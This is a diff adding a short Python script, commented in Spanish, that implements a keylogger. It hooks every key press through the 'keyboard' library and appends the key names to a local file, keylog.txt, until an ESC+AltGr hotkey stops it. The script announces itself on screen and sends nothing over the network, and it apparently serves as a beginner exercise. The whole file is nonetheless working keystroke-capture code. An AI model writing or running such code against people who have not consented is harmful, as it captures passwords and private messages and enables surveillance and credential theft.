@@ -1,0 +1,21 @@
+# Importo la libreria necesario para el keylogger
+import keyboard
+# Creo un archivo de texto para guardar las teclas pulsadas o en el caso de que ya exista, lo vacio
+with open("keylog.txt", "w") as log_file:
+    log_file.write("")
+# Creo una funcion que se encargara de guardar las teclas pulsadas en el archivo de texto
+def iniciar_keylogger(tecla):
+    with open("keylog.txt", "a") as log_file:
+        log_file.write(f"{tecla.name} ")
+# Con esta línea leo las teclas pulsadas
+keyboard.on_press(iniciar_keylogger)
+# Creo una función para parar el keylogger
+def parar_keylogger():
+    print("Keylogger parado.")
+    keyboard.unhook_all()
+    exit()
+# Llamo a la funcion con una combinacion de teclas y para el keylogger
+keyboard.add_hotkey('esc+alt gr', parar_keylogger)
+print("Keylogger funcionando. Pulsa ESC+AltGr para pararlo.")
+# Con esta ultima línea mantengo el programa en ejecución
+keyboard.wait()
